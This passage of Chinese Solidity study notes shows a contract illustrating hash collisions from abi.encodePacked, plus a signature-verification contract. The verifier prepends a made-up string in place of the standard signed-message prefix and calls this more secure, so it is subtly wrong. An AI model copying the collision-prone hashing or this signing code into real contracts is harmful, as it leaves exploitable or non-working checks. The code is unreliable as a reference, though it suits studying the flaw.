class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract HashFunc&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">encode</span><span class="params">(<span class="built_in">string</span> memory text0,<span class="built_in">string</span> memory text1)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> abi.encode(text0,text1);<span class="comment">//返回值会补充0</span></span><br><span class="line">    &#125;</span><br><span class="line">     function <span class="title function_">encodePacked</span><span class="params">(<span class="built_in">string</span> memory text0,<span class="built_in">string</span> memory text1)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(text0,text1);<span class="comment">//不会补充零，造成漏洞 &quot;AAA&quot;&quot;BB&quot;的返回值与&quot;AA&quot;&quot;ABB&quot;一模一样</span></span><br><span class="line">    &#125;                                       <span class="comment">//AAA BB表示是传入的text0与text1</span></span><br><span class="line">    function <span class="title function_">hash</span><span class="params">(<span class="built_in">string</span> memory text,uint num,address addr)</span>external pure <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> keccak256(abi.encodePacked(text,num,addr));<span class="comment">//encodePacked这种会造成哈希碰撞</span></span><br><span class="line">                                                        <span class="comment">//就是打包之后&quot;AAA&quot;&quot;BB&quot;的哈希与&quot;AA&quot;&quot;ABB&quot;一样</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//encodePacked漏洞解决：在两个text之间uint一个数，这样就解决了</span></span><br></pre></td></tr></table></figure></p><h2 id="在智能合约中验证签名"><a href="#在智能合约中验证签名" class="headerlink" title="在智能合约中验证签名"></a>在智能合约中验证签名</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">四步骤:</span></span><br><span class="line"><span class="comment">1.message to sign</span></span><br><span class="line"><span class="comment">2.hash(message)</span></span><br><span class="line"><span class="comment">3.sign(hash(message),private key) | offchain(链下完成)</span></span><br><span class="line"><span class="comment">4.ecrecover(hash(message),signature)==signer  恢复签名，得出签名人的地址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">contract VerifySig&#123;<span class="comment">//签名的验证</span></span><br><span class="line">    function <span class="title function_">verify</span><span class="params">(address _signer,<span class="built_in">string</span> memory _message,bytes memory _sig)</span></span><br><span class="line">        external pure <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>  <span class="comment">//_sig 签名结果</span></span><br><span class="line">    &#123;</span><br><span class="line">        bytes32 messageHash=getMessageHash(_message);</span><br><span class="line">        bytes32 ethSignedMessageHash=getEthSignedMessageHash(messageHash);</span><br><span class="line">        <span class="keyword">return</span> recover(ethSignedMessageHash,_sig)==_signer;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getMessageHash</span><span class="params">(<span class="built_in">string</span> memory _message)</span>public pure <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(_message));<span class="comment">//第一次加密</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getEthSignedMessageHash</span><span class="params">(bytes32 _messageHash)</span>public pure <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;<span class="comment">//第二次加密</span></span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;ZengJiaZiFuChuan&quot;</span>,_messageHash));<span class="comment">//两次哈希且增加字符串更安全</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 _ethSignedMessageHash,bytes memory _sig)</span></span><br><span class="line">        public pure <span class="title function_">returns</span><span class="params">(address)</span></span><br><span class="line">        &#123;<span class="comment">//得到签名人地址</span></span><br><span class="line">            (bytes32 r,bytes32 s,uint8 v)=_split(_sig);</span><br><span class="line">           <span class="keyword">return</span> ecrecover(_ethSignedMessageHash,v,r,s);</span><br><span class="line">        &#125;</span><br><span class="line">        function _split(bytes memory _sig)internal pure<span class="comment">//分割</span></span><br><span class="line">            returns(bytes32 r,bytes32 s,uint8 v)<span class="comment">//32+32+1=65位的长度</span></span><br><span class="line">        &#123;<span class="comment">//将加密信息分割成r s v</span></span><br><span class="line">           require(_sig.length==<span class="number">65</span>,<span class="string">&quot;invalid length&quot;</span>);</span><br><span class="line">           assembly &#123;<span class="comment">//用内联汇编进行分割_sig（只能）</span></span><br><span class="line">                r:=mload(add(_sig,<span class="number">32</span>))</span><br><span class="line">                s:=mload(add(_sig,<span class="number">64</span>))</span><br><span class="line">                v:=byte(<span class="number">0</span>,mload(add(_sig,<span class="number">96</span>)))</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
